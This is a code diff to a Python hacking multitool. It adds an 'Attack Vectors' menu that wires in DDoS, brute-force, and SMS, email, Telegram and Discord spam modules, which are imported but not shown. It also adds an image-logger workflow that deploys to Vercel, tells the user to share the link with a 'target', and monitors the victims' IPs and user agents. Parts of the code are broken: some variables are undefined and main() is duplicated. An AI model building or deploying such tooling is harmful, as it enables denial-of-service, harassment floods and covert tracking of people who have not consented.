@@ -11,6 +11,108 @@ Logging Core       : Optimized Thread-Safe Dual-Stream Intercept Logging Engine
 Visual Layer       : Cross-Platform Background Daemon Window-Title Matrix Scrambler
 ================================================================================
 """
+# ================================================================================
+class Colors:
+    """
+    High-visibility ANSI console formatting control strings.
+    Provides standard 16-color virtual terminal attribute configurations.
+    """
+    RED = '\033[91m'
+    AMBER = '\033[93m'
+    YELLOW = '\033[93m'
+    GREEN = '\033[92m'
+    CYAN = '\033[96m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    
+    # Absolute terminal clearance code sequence:
+    # \033[2J -> Erase active viewing canvas
+    # \033[3J -> Fully purge scrollback cache history buffer blocks
+    # \033[H  -> Reset hardware cursor context to coordinates 0,0
+    CLEAR_SCREEN = '\033[2J\033[3J\033[H'
+# ================================================================================
+# --- NEW IMPORTS FOR BEAST BOMBER CATEGORY 5 ---
+import sys
+from pathlib import Path
+
+# Add project root to path for core module imports
+sys.path.insert(0, str(Path(__file__).parent))
+
+# Initialize placeholders for optional Beast Bomber engines and UI helpers
+SMSAttack = None
+DDoSAttack = None
+DiscordSpam = None
+EmailAttack = None
+TelegramAttack = None
+BruteForceAttack = None
+ImageLogger = None
+BeastSettings = None
+IMPORTS_OK = False
+get_lang = None
+logo_main = None
+menu_ru = None
+menu_en = None
+logo_sms = None
+logo_ddos = None
+logo_email = None
+logo_discord = None
+logo_telegram = None
+logo_bruteforce = None
+
+# UI & Config helpers (critical for Beast Bomber menu display)
+try:
+    from core.etc.settings import Settings as BeastSettings
+    from core.etc.functions import get_lang, logo_main, menu_ru, menu_en, \
+        logo_sms, logo_ddos, logo_email, logo_discord, logo_telegram, logo_bruteforce
+    try:
+        from colorama import init, Fore, Style, Back
+        init()
+    except ImportError:
+        pass
+
+    IMPORTS_OK = True
+except Exception as e:
+    print(f"{Colors.RED}[!] Warning: Could not load Beast Bomber UI modules. Check 'core' folder structure.{e}{Colors.RESET}")
+
+# Engine modules — each imported independently so a single missing dependency
+# (e.g. opentele for Telegram) doesn't block all imports.
+try:
+    from core.sms_spam.sms import SMSAttack
+except Exception:
+    pass
+
+try:
+    from core.ddos_attack.ddos import DDoSAttack
+except Exception:
+    pass
+
+try:
+    from core.discord_spam.discord import DiscordSpam
+except Exception:
+    pass
+
+try:
+    from core.email_spam.email_attack import EmailAttack
+except Exception:
+    pass
+
+try:
+    from core.telegram_spam.telegram import TelegramAttack
+except Exception:
+    pass
+
+try:
+    from core.brute_force.bruteforce import BruteForceAttack
+except Exception:
+    pass
+
+try:
+    from core.image_logger.imagelogger import ImageLogger
+except Exception:
+    pass
+
+# --- END NEW IMPORTS ---
 
 import os
 import sys
@@ -28,6 +130,7 @@ import hashlib
 import platform
 import re
 import math
+import webbrowser
 from concurrent.futures import ThreadPoolExecutor
 import urllib.request
 import urllib.error
@@ -40,25 +143,6 @@ if sys.platform.startswith('win'):
         kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
     except Exception:
         os.system('')
-
-class Colors:
-    """
-    High-visibility ANSI console formatting control strings.
-    Provides standard 16-color virtual terminal attribute configurations.
-    """
-    RED = '\033[91m'
-    AMBER = '\033[93m'
-    GREEN = '\033[92m'
-    CYAN = '\033[96m'
-    RESET = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    
-    # Absolute terminal clearance code sequence:
-    # \033[2J -> Erase active viewing canvas
-    # \033[3J -> Fully purge scrollback cache history buffer blocks
-    # \033[H  -> Reset hardware cursor context to coordinates 0,0
-    CLEAR_SCREEN = '\033[2J\033[3J\033[H'
 
 class DualStreamWriter:
     """
@@ -118,8 +202,9 @@ class MainframeUI:
         print(f"  [{Colors.CYAN}2{Colors.RESET}] Sub-Directory 02 // External OSINT & Target Record Profilers")
         print(f"  [{Colors.GREEN}3{Colors.RESET}] Sub-Directory 03 // Local Data Traffic Monitors, Audits & Utilities")
         print(f"  [{Colors.CYAN}4{Colors.RESET}] Sub-Directory 04 // Advanced Infrastructure Audits & Integrity Cores")
+        print(f"  [{Colors.RED}5{Colors.RESET}] Sub-Directory 05 // Attack Vectors & Exploit Frameworks [SHELL BASELINE]")
         print("\n" + f"{Colors.RED}[SYSTEM SHUTDOWN CONTROL]{Colors.RESET}")
-        print(f"  [{Colors.RED}5{Colors.RESET}] Terminate Active Mainframe Operator Control Session")
+        print(f"  [{Colors.RED}6{Colors.RESET}] Terminate Active Mainframe Operator Control Session")
         print(f"\n{Colors.BOLD}{Colors.GREEN}" + "-" * 80 + f"{Colors.RESET}")
 
     @staticmethod
@@ -185,6 +270,21 @@ class MainframeUI:
         print("\n" + f"{Colors.CYAN}[NAVIGATION FRAMEWORK]{Colors.RESET}")
         print("  [10] Return to Main System Directory Core")
         print(f"\n{Colors.BOLD}{Colors.CYAN}" + "-" * 80 + f"{Colors.RESET}")
+
+    @staticmethod
+    def display_attack_menu():
+        """Submenu for attack vectors and exploit frameworks."""
+        print(f"{Colors.RED}[SUB-DIRECTORY 05 // ATTACK VECTORS & EXPLOIT FRAMEWORKS]{Colors.RESET}\n")
+        print("  [1] Beast Mode (DDoS)")
+        print("  [2] Image Logger")
+        print("  [3] Brute Force")
+        print("  [4] SMS Spam")
+        print("  [5] Email Spam")
+        print("  [6] Telegram Spam")
+        print("  [7] Discord Spam")
+        print("\n" + f"{Colors.CYAN}[NAVIGATION FRAMEWORK]{Colors.RESET}")
+        print("  [8] Return to Main System Directory Core")
+        print(f"\n{Colors.BOLD}{Colors.RED}" + "-" * 80 + f"{Colors.RESET}")
 
 def find_global_command(command_name):
     """
@@ -264,7 +364,6 @@ def title_scrambler_daemon():
                 sys.stderr.flush()
             except Exception:
                 pass
-        time.sleep(0.15)
 
 # ================================================================================
 # SUB-DIRECTORY 01 ENGINE ROUTINES (NETWORK CORES)
@@ -508,7 +607,7 @@ def run_subdomain_finder():
         return
         
     print(f"\n{Colors.GREEN}Opening stream to transparency certificate logs database endpoint...{Colors.RESET}")
-    url = f"https://crt.sh.{target_root}&output=json"
+    url = f"https://crt.sh/?q={target_root}&output=json"
     req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
     
     try:
@@ -562,7 +661,7 @@ def run_rdap_lookup():
         lookup_ip = target_input
 
     print(f"\n{Colors.GREEN}Sending configuration request packet array to RDAP name registries...{Colors.RESET}")
-    url = f"https://rdap.org{lookup_ip}"
+    url = f"https://rdap.org/ip/{lookup_ip}"
     req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
     
     try:
@@ -645,7 +744,7 @@ def run_doh_resolver():
     record_type = {"1": "A", "2": "AAAA", "3": "MX", "4": "TXT"}.get(choice, "A")
     
     print(f"\n{Colors.GREEN}Dispatching secure encrypted HTTPS GET packet query to cloudflare-dns.com...{Colors.RESET}")
-    url = f"https://cloudflare-dns.com{target_domain}&type={record_type}"
+    url = f"https://cloudflare-dns.com/dns-query?name={target_domain}&type={record_type}"
     req = urllib.request.Request(url, headers={'Accept': 'application/dns-json', 'User-Agent': 'Mainframe-DoH-Core'})
     
     try:
@@ -779,7 +878,7 @@ def run_live_breach_checker():
             time.sleep(1.2)
             return
         print(f"\n{Colors.GREEN}Querying XposedOrNot live database registry...{Colors.RESET}")
-        url = f"https://xposedornot.com{target_email}"
+        url = f"https://xposedornot.com/api/v1/account/{target_email}"
         req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
         try:
             with urllib.request.urlopen(req, timeout=10) as response:
@@ -811,7 +910,7 @@ def run_live_breach_checker():
         prefix = sha1_hash[:5]
         suffix = sha1_hash[5:]
         
-        url = f"https://pwnedpasswords.com{prefix}"
+        url = f"https://api.pwnedpasswords.com/range/{prefix}"
         req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
         try:
             with urllib.request.urlopen(req, timeout=10) as response:
@@ -1289,12 +1388,12 @@ def run_ssl_auditor():
         print(f"  ➔ Active Cipher Suite: {Colors.CYAN}{negotiated_cipher[0]}{Colors.RESET} ({negotiated_cipher[1]} Protocol Build)")
         
         if peer_certificate:
-            from datetime import datetime
+            from datetime import datetime, timezone
             expiration_string = peer_certificate.get('notAfter')
             if expiration_string:
                 try:
                     expiry_date = datetime.strptime(expiration_string, '%b %d %H:%M:%S %Y %Z')
-                    remaining_days = (expiry_date - datetime.utcnow()).days
+                    remaining_days = (expiry_date - datetime.now(timezone.utc).replace(tzinfo=None)).days
                     status_color = Colors.GREEN if remaining_days > 30 else Colors.RED
                     print(f"  ➔ Expiration Limit  : {expiration_string} ({status_color}{remaining_days} Days Remaining{Colors.RESET})")
                 except Exception:
@@ -1616,7 +1715,7 @@ def run_mac_vendor_lookup():
         print(f"  ➔ Resolution Layer   : Local Static Cache Index Registry (Offline Success)")
     else:
         print(f"{Colors.CYAN}Prefix absent from offline cache matrix. Dispatching API request to macvendors.com...{Colors.RESET}")
-        url = f"https://macvendors.com{formatted_oui}"
+        url = f"https://api.macvendors.com/{formatted_oui}"
         req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Terminal-Multitool'})
         try:
             with urllib.request.urlopen(req, timeout=8) as response:
@@ -1634,6 +1733,77 @@ def run_mac_vendor_lookup():
             
     print("-" * 75)
     input(f"\nProcessing complete. Press Enter to pull up sub-directory options...")
+
+# ================================================================================
+# CENTRAL SUBSYSTEM SHELL MATRIX ORCHESTRATION LOOP
+# ================================================================================
+
+def main():
+    """
+    Main runtime entry point. Natively checks for administrative credentials
+    on Windows environments and enforces self-contained UAC auto-elevation triggers.
+    """
+    if sys.platform.startswith('win'):
+        try:
+            if not ctypes.windll.shell32.IsUserAnAdmin():
+                print("[!] Mainframe Core: Elevating operating privileges to Administrator...")
+                time.sleep(1)
+                # Re-invoke python executable context using shell UAC elevation triggers
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+                sys.exit(0)
+        except Exception as elevation_error:
+            print(f"Windows privilege monitor initialization error: {elevation_error}")
+            time.sleep(2)
+
+    # Initialize the cross-platform background window title matrix scrambler daemon thread
+    try:
+        scrambler_thread = threading.Thread(target=title_scrambler_daemon, daemon=True)
+        scrambler_thread.start()
+    except Exception as scrambler_err:
+        print(f"[!] Warning: Title matrix custom visual layer bypassed: {scrambler_err}")
+
+    # Engaged Session Logging Infrastructure
+    try:
+        log_directory = "logs"
+        os.makedirs(log_directory, exist_ok=True)
+        session_timestamp = time.strftime("%Y%m%d_%H%M%S")
+        log_file_name = os.path.join(log_directory, f"session_{session_timestamp}.txt")
+        
+        # Instantiate dual stream hook to duplicate runtime terminal history to disk safely
+        active_log_handle = open(log_file_name, "w", encoding="utf-8")
+        sys.stdout = DualStreamWriter(sys.stdout, active_log_handle)
+        print(f"[+] Automated Dual-Stream System Logging Operational Cores Engaged.")
+        print(f"[+] Log Target Vector Initialized: {log_file_name}\n")
+        time.sleep(1)
+    except Exception as log_init_err:
+        print(f"[!] Warning: Session logging buffer core initialization interrupted: {log_init_err}")
+        time.sleep(1.5)
+
+    while True:
+        try:
+            print(Colors.CLEAR_SCREEN)
+            MainframeUI.draw_banner()
+            MainframeUI.display_main_menu()
+            
+            selection_target = input(f"{Colors.BOLD}mainframe@operator_console:~# {Colors.RESET}").strip()
+            
+            if selection_target in ["1", "2", "3", "4", "5"]:
+                handle_category_deck(selection_target)
+            elif selection_target == "6":
+                print(f"\n{Colors.RED}Disconnecting security core links. Clearing memory trace structures...{Colors.RESET}")
+                time.sleep(1)
+                print(f"{Colors.GREEN}Console session closed successfully. Systems baseline nominal.{Colors.RESET}\n")
+                break
+            else:
+                print(f"\n{Colors.RED}[!] Unknown instruction parameter sequence. Resetting workspace...{Colors.RESET}")
+                time.sleep(1.2)
+                
+        except KeyboardInterrupt:
+            print(f"\n\n{Colors.GREEN}[!] Main operational workflow interrupted. Disposing active frames...{Colors.RESET}")
+            break
+        except Exception as internal_error:
+            print(f"\n{Colors.RED}Mainframe master pipeline failure logged: {internal_error}{Colors.RESET}")
+            time.sleep(2)
 
 # ================================================================================
 # CENTRAL SUBSYSTEM SHELL MATRIX ORCHESTRATION LOOP
@@ -1742,76 +1912,337 @@ def handle_category_deck(deck_id):
                 run_mac_vendor_lookup()
             elif operator_input == "10":
                 break
-        else:
-            break
 
-def main():
-    """
-    Main runtime entry point. Natively checks for administrative credentials
-    on Windows environments and enforces self-contained UAC auto-elevation triggers.
-    """
-    if sys.platform.startswith('win'):
-        try:
-            if not ctypes.windll.shell32.IsUserAnAdmin():
-                print("[!] Mainframe Core: Elevating operating privileges to Administrator...")
-                time.sleep(1)
-                # Re-invoke python executable context using shell UAC elevation triggers
-                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-                sys.exit(0)
-        except Exception as elevation_error:
-            print(f"Windows privilege monitor initialization error: {elevation_error}")
-            time.sleep(2)
-
-    # Initialize the cross-platform background window title matrix scrambler daemon thread
-    try:
-        scrambler_thread = threading.Thread(target=title_scrambler_daemon, daemon=True)
-        scrambler_thread.start()
-    except Exception as scrambler_err:
-        print(f"[!] Warning: Title matrix custom visual layer bypassed: {scrambler_err}")
-
-    # Engaged Session Logging Infrastructure
-    try:
-        log_directory = "logs"
-        os.makedirs(log_directory, exist_ok=True)
-        session_timestamp = time.strftime("%Y%m%d_%H%M%S")
-        log_file_name = os.path.join(log_directory, f"session_{session_timestamp}.txt")
-        
-        # Instantiate dual stream hook to duplicate runtime terminal history to disk safely
-        active_log_handle = open(log_file_name, "w", encoding="utf-8")
-        sys.stdout = DualStreamWriter(sys.stdout, active_log_handle)
-        print(f"[+] Automated Dual-Stream System Logging Operational Cores Engaged.")
-        print(f"[+] Log Target Vector Initialized: {log_file_name}\n")
-        time.sleep(1)
-    except Exception as log_init_err:
-        print(f"[!] Warning: Session logging buffer core initialization interrupted: {log_init_err}")
-        time.sleep(1.5)
-
-    while True:
-        try:
-            # Wipe view stack completely before drawing fresh menu maps
-            print(Colors.CLEAR_SCREEN)
-            MainframeUI.draw_banner()
-            MainframeUI.display_main_menu()
+        # --- ENGINE PIPELINE 05: ATTACK VECTORS SUBMENU ---
+        elif deck_id == "5":
+            MainframeUI.display_attack_menu()
+            operator_input = input(f"{Colors.BOLD}mainframe@attack_vectors:~# {Colors.RESET}").strip()
             
-            selection_target = input(f"{Colors.BOLD}mainframe@operator_console:~# {Colors.RESET}").strip()
-            
-            if selection_target in ["1", "2", "3", "4"]:
-                handle_category_deck(selection_target)
-            elif selection_target == "5":
-                print(f"\n{Colors.RED}Disconnecting security core links. Clearing memory trace structures...{Colors.RESET}")
-                time.sleep(1)
-                print(f"{Colors.GREEN}Console session closed successfully. Systems baseline nominal.{Colors.RESET}\n")
+            if operator_input == "1":
+                if ddos_attack is None:
+                    print(f"{Colors.RED}[!] DDoS Attack module not loaded.{Colors.RESET}")
+                else:
+                    ddos_attack.start_ddos()
+            elif operator_input == "2":
+                run_image_logger()
+            elif operator_input == "3":
+                if bruteforce_attack is None:
+                    print(f"{Colors.RED}[!] Brute Force module not loaded.{Colors.RESET}")
+                else:
+                    bruteforce_attack.start_bruteforce()
+            elif operator_input == "4":
+                if sms_attack is None:
+                    print(f"{Colors.RED}[!] SMS Attack module not loaded.{Colors.RESET}")
+                else:
+                    sms_attack.start_sms()
+            elif operator_input == "5":
+                if email_attack is None:
+                    print(f"{Colors.RED}[!] Email Attack module not loaded.{Colors.RESET}")
+                else:
+                    email_attack.email_start()
+            elif operator_input == "6":
+                if telegram_attack is None:
+                    print(f"{Colors.RED}[!] Telegram Attack module not loaded.{Colors.RESET}")
+                else:
+                    telegram_attack.start_telegram()
+            elif operator_input == "7":
+                if discord_attack is None:
+                    print(f"{Colors.RED}[!] Discord Attack module not loaded.{Colors.RESET}")
+                else:
+                    discord_attack.start_discord()
+            elif operator_input == "8":
                 break
             else:
                 print(f"\n{Colors.RED}[!] Unknown instruction parameter sequence. Resetting workspace...{Colors.RESET}")
                 time.sleep(1.2)
-                
-        except KeyboardInterrupt:
-            print(f"\n\n{Colors.GREEN if hasattr(Colors, 'GREEN') else Colors.RESET}[!] Main operational workflow interrupted. Disposing active frames...{Colors.RESET}")
+        else:
             break
-        except Exception as internal_error:
-            print(f"\n{Colors.RED}Mainframe master pipeline failure logged: {internal_error}{Colors.RESET}")
+
+def handle_attack_vectors():
+    """Handles Sub-Directory 05 // Attack Vectors & Exploit Frameworks"""
+    
+    if not IMPORTS_OK:
+        print(f"{Colors.RED}[!] Beast Bomber modules not found. Ensure they are installed in 'core' folder or adjust import paths.{Colors.RESET}")
+        return
+        
+    if sys.platform.startswith('win'):
+        try:
+            ctypes.windll.kernel32.SetConsoleTitleW("Beast Bomber 💣")
+        except:
+            pass
+            
+    logo_main()
+    
+    if get_lang() == "ru":
+        menu_ru()
+    else:
+        menu_en()
+        
+    from colorama import Fore, Style
+    
+    sms_attack = SMSAttack() if SMSAttack else None
+    email_attack = EmailAttack() if EmailAttack else None
+    telegram_attack = TelegramAttack() if TelegramAttack else None
+    discord_attack = DiscordSpam() if DiscordSpam else None
+    ddos_attack = DDoSAttack() if DDoSAttack else None
+    bruteforce_attack = BruteForceAttack() if BruteForceAttack else None
+    
+    while True:
+        print(f"{Fore.MAGENTA}{'>'}{Fore.GREEN}", end="") 
+        option = input("\nSelect Attack Vector (0=Exit): ").strip()
+
+        try:
+            if option == '1':
+                if ddos_attack is None:
+                    print(f"{Fore.RED}[!] DDoS Attack module not loaded.{Colors.RESET}")
+                else:
+                    print("Launching Beast Mode Core...")
+                    ddos_attack.start_ddos()
+                
+            elif option == '2':
+                print("Launching Image Logger...")
+                run_image_logger()
+            
+            elif option == '3':
+                if bruteforce_attack is None:
+                    print(f"{Fore.RED}[!] Brute Force module not loaded.{Colors.RESET}")
+                else:
+                    print("Launching Brute Force Core...")
+                    bruteforce_attack.start_bruteforce()
+            
+            elif option == '4':
+                if sms_attack is None:
+                    print(f"{Fore.RED}[!] SMS Attack module not loaded.{Colors.RESET}")
+                else:
+                    print("Launching SMS Stream...")
+                    sms_attack.start_sms()
+                
+            elif option == '5':
+                if email_attack is None:
+                    print(f"{Fore.RED}[!] Email Attack module not loaded.{Colors.RESET}")
+                else:
+                    print("Launching Email Flood...")
+                    email_attack.email_start()
+                
+            elif option == '6':
+                if telegram_attack is None:
+                    print(f"{Fore.RED}[!] Telegram Attack module not loaded.{Colors.RESET}")
+                else:
+                    print("Launching Telegram Injector...")
+                    telegram_attack.start_telegram()
+                
+            elif option == '7':
+                if discord_attack is None:
+                    print(f"{Fore.RED}[!] Discord Attack module not loaded.{Colors.RESET}")
+                else:
+                    print("Launching Discord Spammer...")
+                    discord_attack.start_discord()
+                
+            elif option == '8':
+                break
+                
+            elif option.lower() == '0' or option == "exit":
+                print(f"\n{Colors.RED}Disconnecting attack vector links.Clearing memory trace structures...{Colors.RESET}")
+                time.sleep(1)
+                break
+                
+            else:
+                print(f"{Colors.RED}[!] Invalid option.{Colors.RESET}")
+                
+        except AttributeError:
+             if get_lang() == "ru": 
+                 print(Fore.RED + '\nМодуль не найден или требует инициализации.')
+             else:
+                 print(Fore.RED + f'\nModule {option} not initialized properly. Check Beast Bomber paths.')
+        except Exception as e:
+            error_msg = str(e)[:50]
+            if get_lang() == "ru":
+                print(f"\n{Fore.YELLOW}{Colors.BOLD}[!] Ошибка в модуле:{e}{Colors.RESET}")
+            else:
+                print(f"\n{Fore.YELLOW}{Colors.BOLD}[!] Error in module:{e}{Colors.RESET}")
+
+        finally:
+            time.sleep(1.5) 
+
+def run_image_logger():
+    """Starts an instant image logger that captures victim IP when they open the image."""
+    print(f"\n{Colors.CYAN}[INSTANT IMAGE LOGGER]{Colors.RESET}")
+    print(f"{Colors.GREEN}Select deployment method:{Colors.RESET}")
+    print(f"  [{Colors.AMBER}1{Colors.RESET}] Local Server (http://localhost:8080)")
+    print(f"  [{Colors.AMBER}2{Colors.RESET}] Deploy to Vercel (Public URL)")
+    print(f"  [{Colors.AMBER}3{Colors.RESET}] Return to Menu")
+    
+    choice = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Select: ").strip()
+    
+    if choice == '1':
+        print(f"\n{Colors.GREEN}Starting local image logger server...{Colors.RESET}")
+        try:
+            from core.image_logger.imagelogger import ImageLogger
+            logger = ImageLogger(port=8080)
+            logger.start_and_monitor()
+        except ImportError:
+            print(f"{Colors.RED}[!] Image Logger module not found.{Colors.RESET}")
             time.sleep(2)
+        except Exception as e:
+            print(f"{Colors.RED}[!] Image Logger error: {e}{Colors.RESET}")
+            time.sleep(2)
+    elif choice == '2':
+        deploy_vercel_logger()
+    elif choice == '3':
+        return
+    else:
+        print(f"{Colors.RED}[!] Invalid option.{Colors.RESET}")
+        time.sleep(1)
+
+def deploy_vercel_logger():
+    """Deploys the image logger to Vercel for a public URL."""
+    print(f"\n{Colors.CYAN}[VERCEL IMAGE LOGGER DEPLOYMENT]{Colors.RESET}")
+    print(f"{Colors.GREEN}Preparing Vercel deployment...{Colors.RESET}")
+    
+    vercel_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vercel-image-logger')
+    
+    if not os.path.exists(vercel_dir):
+        print(f"{Colors.RED}[!] Vercel deployment folder not found at: {vercel_dir}{Colors.RESET}")
+        time.sleep(2)
+        return
+    
+    print(f"{Colors.GREEN}Vercel project ready at: {vercel_dir}{Colors.RESET}")
+    print(f"{Colors.AMBER}To deploy:{Colors.RESET}")
+    print(f"  1. Install Vercel CLI: {Colors.CYAN}npm i -g vercel{Colors.RESET}")
+    print(f"  2. Navigate to: {Colors.CYAN}{vercel_dir}{Colors.RESET}")
+    print(f"  3. Run: {Colors.CYAN}vercel --prod{Colors.RESET}")
+    print(f"  4. Share the public URL with your target{Colors.RESET}")
+    
+    deploy_now = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Attempt auto-deploy now? (y/n): ").strip().lower()
+    
+    if deploy_now == 'y':
+        try:
+            import subprocess
+            original_dir = os.getcwd()
+            os.chdir(vercel_dir)
+            
+            vercel_cmd = None
+            candidates = [
+                os.path.join(os.environ.get('APPDATA', ''), 'npm', 'vercel.cmd'),
+                os.path.join(os.environ.get('APPDATA', ''), 'npm', 'vercel'),
+                'vercel',
+            ]
+            for candidate in candidates:
+                if os.path.exists(candidate):
+                    vercel_cmd = candidate
+                    break
+            
+            if not vercel_cmd:
+                print(f"{Colors.RED}[!] Vercel CLI not found. Install with: npm i -g vercel{Colors.RESET}")
+                input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
+                return
+            
+            print(f"{Colors.GREEN}Running vercel --prod...{Colors.RESET}")
+            env = os.environ.copy()
+            npm_dir = os.path.join(os.environ.get('APPDATA', ''), 'npm')
+            node_dir = r'C:\Program Files\nodejs'
+            env['PATH'] = node_dir + os.pathsep + npm_dir + os.pathsep + env.get('PATH', '')
+            
+            result = subprocess.run(
+                ['cmd', '/c', vercel_cmd, '--prod', '-y'],
+                capture_output=True,
+                text=True,
+                timeout=120,
+                env=env
+            )
+            
+            os.chdir(original_dir)
+            
+            if result.returncode == 0:
+                print(f"{Colors.GREEN}Deployment successful!{Colors.RESET}")
+                
+                alias_match = re.search(r'Aliased\s+(https?://[^\s]+\.vercel\.app)', result.stdout + result.stderr)
+                url_match = re.search(r'https?://[^\s]+\.vercel\.app', result.stdout + result.stderr)
+                
+                if alias_match:
+                    public_url = alias_match.group(1)
+                elif url_match:
+                    public_url = url_match.group(0)
+                else:
+                    public_url = None
+                
+                if public_url:
+                    print(f"{Colors.CYAN}Public URL: {Colors.YELLOW}{public_url}{Colors.RESET}")
+                    print(f"{Colors.GREEN}Share this URL with your target!{Colors.RESET}")
+                    print(f"\n{Fore.GREEN}Starting live monitor...{Fore.RESET}")
+                    print(f"{Colors.AMBER}Press Ctrl+C to stop monitoring{Colors.RESET}\n")
+                    time.sleep(1)
+                    monitor_vercel_logs(public_url)
+                else:
+                    print(f"{Colors.AMBER}Deployment succeeded but URL not detected. Check Vercel dashboard.{Colors.RESET}")
+            else:
+                print(f"{Colors.RED}Deployment failed:{Colors.RESET}")
+                print(result.stderr)
+        except FileNotFoundError:
+            print(f"{Colors.RED}[!] Vercel CLI not found. Install with: npm i -g vercel{Colors.RESET}")
+        except subprocess.TimeoutExpired:
+            print(f"{Colors.RED}[!] Deployment timed out.{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.RED}[!] Deployment error: {e}{Colors.RESET}")
+        
+        input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
+
+def monitor_vercel_logs(public_url):
+    """Polls Vercel logs endpoint for captured IPs."""
+    logs_url = public_url.rstrip('/') + '/api/logs'
+    print(f"\n{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} MONITORING VERCEl LOGS {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
+    print(f"{Fore.YELLOW}{public_url}{Fore.RESET}")
+    print(f"{Fore.CYAN}Logs URL: {Fore.YELLOW}{logs_url}{Fore.RESET}")
+    print(f"{Fore.GREEN}Press Enter to stop...{Fore.RESET}\n")
+    
+    seen_ips = set()
+    last_count = 0
+    
+    try:
+        while True:
+            try:
+                import urllib.request
+                req = urllib.request.Request(logs_url, headers={'User-Agent': 'Mainframe-Monitor'})
+                with urllib.request.urlopen(req, timeout=5) as resp:
+                    logs = json.loads(resp.read().decode('utf-8'))
+                
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} MONITORING VERCEl LOGS {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
+                print(f"{Fore.YELLOW}{public_url}{Fore.RESET}")
+                print(f"{Fore.CYAN}Logs URL: {Fore.YELLOW}{logs_url}{Fore.RESET}")
+                print(f"{Fore.GREEN}Press Enter to stop...{Fore.RESET}\n")
+                print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
+                print(f"{Style.BRIGHT}{Fore.WHITE}{'TIMESTAMP':<25} {'IP ADDRESS':<20} {'USER AGENT':<35}{Fore.RESET}{Style.RESET_ALL}")
+                print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
+                
+                new_logs = []
+                for log in logs:
+                    ip = log.get('ip', 'unknown')
+                    if ip not in seen_ips:
+                        seen_ips.add(ip)
+                        new_logs.append(log)
+                        ua = log.get('userAgent', log.get('user_agent', 'Unknown'))
+                        ua = (ua[:32] + '...') if len(ua) > 35 else ua
+                        ts = log.get('timestamp', 'N/A')
+                        print(f"{Fore.WHITE}{ts:<25} {Fore.GREEN}{ip:<20} {Fore.CYAN}{ua:<35}{Fore.RESET}")
+                
+                if new_logs:
+                    print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
+                    print(f"{Fore.YELLOW}New captures: {len(new_logs)} | Total: {len(logs)}{Fore.RESET}\n")
+                elif not logs:
+                    print(f"{Colors.AMBER}Waiting for captures...{Colors.RESET}\n")
+                    
+                last_count = len(logs)
+                
+            except Exception as e:
+                print(f"{Fore.RED}Monitor error: {e}{Fore.RESET}")
+            
+            time.sleep(2)
+            
+    except KeyboardInterrupt:
+        pass
 
 if __name__ == "__main__":
     main()
